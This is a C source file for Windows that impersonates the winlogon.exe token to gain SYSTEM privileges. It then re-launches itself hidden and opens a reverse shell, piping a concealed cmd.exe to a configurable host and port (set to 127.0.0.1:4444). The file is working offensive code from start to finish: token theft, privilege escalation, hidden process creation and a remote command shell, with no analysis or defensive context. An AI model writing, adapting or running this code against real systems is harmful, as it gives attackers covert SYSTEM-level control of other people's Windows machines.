// regsvr32_self_reexec_fixed.c
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <wchar.h>
#include <shellapi.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Advapi32.lib")

#define LHOST "127.0.0.1"
#define LPORT 4444

SOCKET g_sock = INVALID_SOCKET;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;

DWORD FindWinlogonPid() {
    PROCESSENTRY32W pe32 = { 0 };
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnap, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, L"winlogon.exe") == 0) {
                DWORD pid = pe32.th32ProcessID;
                CloseHandle(hSnap);
                return pid;
            }
        } while (Process32NextW(hSnap, &pe32));
    }
    CloseHandle(hSnap);
    return 0;
}

DWORD WINAPI SocketToPipe(LPVOID lpParam) {
    char buffer[4096];
    int bytesRead;
    DWORD bytesWritten;
    while ((bytesRead = recv(g_sock, buffer, sizeof(buffer), 0)) > 0) {
        WriteFile(g_hChildStd_IN_Wr, buffer, bytesRead, &bytesWritten, NULL);
    }
    return 0;
}

DWORD WINAPI PipeToSocket(LPVOID lpParam) {
    char buffer[4096];
    DWORD bytesRead;
    while (ReadFile(g_hChildStd_OUT_Rd, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
        send(g_sock, buffer, bytesRead, 0);
    }
    return 0;
}

int DoChildWorkAndServeShell() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) return 1;

    g_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (g_sock == INVALID_SOCKET) return 1;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(LPORT);
    addr.sin_addr.s_addr = inet_addr(LHOST);

    if (connect(g_sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        closesocket(g_sock);
        WSACleanup();
        return 1;
    }

    send(g_sock, "Connected SYSTEM shell...\r\n", 27, 0);

    SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hOutRead = NULL, hOutWrite = NULL, hInRead = NULL, hInWrite = NULL;
    if (!CreatePipe(&hOutRead, &hOutWrite, &saAttr, 0)) return 1;
    if (!CreatePipe(&hInRead, &hInWrite, &saAttr, 0)) { CloseHandle(hOutRead); CloseHandle(hOutWrite); return 1; }

    SetHandleInformation(hOutRead, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hInWrite, HANDLE_FLAG_INHERIT, 0);

    g_hChildStd_IN_Wr = hInWrite;
    g_hChildStd_OUT_Rd = hOutRead;

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = hInRead;
    si.hStdOutput = hOutWrite;
    si.hStdError = hOutWrite;
    si.wShowWindow = SW_HIDE;

    WCHAR cmdPath[] = L"C:\\Windows\\System32\\cmd.exe";

    if (!CreateProcessW(NULL, cmdPath, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hInRead); CloseHandle(hInWrite);
        CloseHandle(hOutRead); CloseHandle(hOutWrite);
        closesocket(g_sock);
        WSACleanup();
        return 1;
    }

    CloseHandle(hInRead);
    CloseHandle(hOutWrite);

    CreateThread(NULL, 0, PipeToSocket, NULL, 0, NULL);
    CreateThread(NULL, 0, SocketToPipe, NULL, 0, NULL);

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    closesocket(g_sock);
    WSACleanup();
    return 0;
}

int ParentDuplicateTokenAndSpawnChildDetached() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return 1;

    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid)) { CloseHandle(hToken); return 1; }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);

    DWORD pid = FindWinlogonPid();
    if (pid == 0) return 1;
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) return 1;

    HANDLE hWinlogonToken = NULL;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hWinlogonToken)) { CloseHandle(hProc); return 1; }
    CloseHandle(hProc);

    HANDLE hDupToken = NULL;
    if (!DuplicateTokenEx(hWinlogonToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) { CloseHandle(hWinlogonToken); return 1; }
    CloseHandle(hWinlogonToken);

    WCHAR pathBuf[MAX_PATH];
    DWORD len = GetModuleFileNameW(NULL, pathBuf, MAX_PATH);
    if (len == 0 || len == MAX_PATH) { CloseHandle(hDupToken); return 1; }

    WCHAR cmdLine[MAX_PATH + 32];
    _snwprintf(cmdLine, _countof(cmdLine), L"\"%s\" --child", pathBuf);

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    DWORD creationFlags = CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP;
    BOOL ok = CreateProcessWithTokenW(hDupToken, 0, NULL, cmdLine, creationFlags, NULL, NULL, &si, &pi);
    CloseHandle(hDupToken);

    if (!ok) return 1;

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}

int main(void) {
    int argc;
    LPWSTR *argvw = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (argvw == NULL) return 1;

    if (argc >= 2 && _wcsicmp(argvw[1], L"--child") == 0) {
        LocalFree(argvw);
        return DoChildWorkAndServeShell();
    }
    LocalFree(argvw);
    return ParentDuplicateTokenAndSpawnChildDetached();
}